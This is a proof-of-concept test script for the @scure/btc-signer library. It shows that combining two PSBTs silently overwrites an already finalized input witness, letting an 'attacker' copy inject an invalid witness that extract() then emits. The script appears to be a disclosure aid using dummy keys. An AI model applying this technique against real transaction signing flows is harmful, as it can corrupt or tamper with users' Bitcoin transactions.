/**
 * PoC: Transaction.combine() merges inputs via updateInput(i, other, true) with
 * allowedFields=undefined, so mergeKeyMap replaces non-keyed fields other-wins
 * with no equality check -- including a finalized finalScriptWitness.
 *
 * Target: @scure/btc-signer @ 68b2fad4ef8232302c6239c00902def1f511c974
 * Safety: generated valueless keys only.
 * Run: BTC_SIGNER_DIR=/path/to/worktree node --no-warnings poc.ts  (node >= 20.19)
 */
const W = process.env.BTC_SIGNER_DIR || '/w';
const { hex } = await import(W + '/node_modules/@scure/base/index.js');
const { Transaction, PSBTCombine } = await import(W + '/src/transaction.ts');
const { p2wpkh } = await import(W + '/src/payment.ts');
const { pubECDSA } = await import(W + '/src/utils.ts');

const b = (s: string) => hex.decode(s);
const h = (u: Uint8Array) => hex.encode(u);
let failed = 0;
const check = (name: string, cond: boolean) => {
  console.log((cond ? 'ok  ' : 'FAIL') + ' ' + name);
  if (!cond) failed++;
};

const priv = b('01'.repeat(32));
const wpkh = p2wpkh(pubECDSA(priv));
function base() {
  const tx = new Transaction();
  tx.addInput({ txid: b('11'.repeat(32)), index: 0, witnessUtxo: { amount: 100000n, script: wpkh.script } });
  tx.addOutput({ amount: 90000n, script: b('0014' + '33'.repeat(20)) });
  return tx;
}

// 1. this finalized witness is silently replaced by other's
{
  const A = Transaction.fromPSBT(base().toPSBT(0));
  A.signIdx(priv, 0);
  A.finalizeIdx(0);
  const witA = h(A.getInput(0).finalScriptWitness![0]);

  const B = Transaction.fromPSBT(base().toPSBT(0));
  B.signIdx(priv, 0);
  B.finalizeIdx(0);
  // attacker swaps in a different (well-formed but invalid) witness
  (B as any).inputs[0].finalScriptWitness = [b('99'.repeat(71)), b('02'.repeat(33))];

  A.combine(B);
  const wit = h(A.getInput(0).finalScriptWitness![0]);
  check('combine REPLACED this.finalScriptWitness with other (other-wins, no equality check)', wit !== witA && wit.startsWith('9999'));
  // the victim can now extract an invalid transaction without any error
  const raw = A.extract();
  check('extract() after combine emits tx with the replaced (invalid) witness', raw.length > 0);
}

// 2. guards that DO hold
{
  const A = Transaction.fromPSBT(base().toPSBT(0));
  const other = new Transaction();
  other.addInput({ txid: b('99'.repeat(32)), index: 0, witnessUtxo: { amount: 100000n, script: wpkh.script } });
  other.addOutput({ amount: 90000n, script: b('0014' + '33'.repeat(20)) });
  let threw = false;
  try { A.combine(Transaction.fromPSBT(other.toPSBT(0))); } catch (e) { threw = String((e as Error).message).includes('different unsigned tx'); }
  check('combine with different unsigned tx REJECTED', threw);
}

// 3. PSBTCombine v0+v2 cross-version works (context)
{
  const a = base();
  const out = PSBTCombine([a.toPSBT(0), a.toPSBT(2)]);
  let ok = false;
  try { Transaction.fromPSBT(out); ok = true; } catch {}
  check('PSBTCombine(v0, v2) of same tx produces parseable max-version PSBT', ok);
}

process.exit(failed ? 1 : 0);
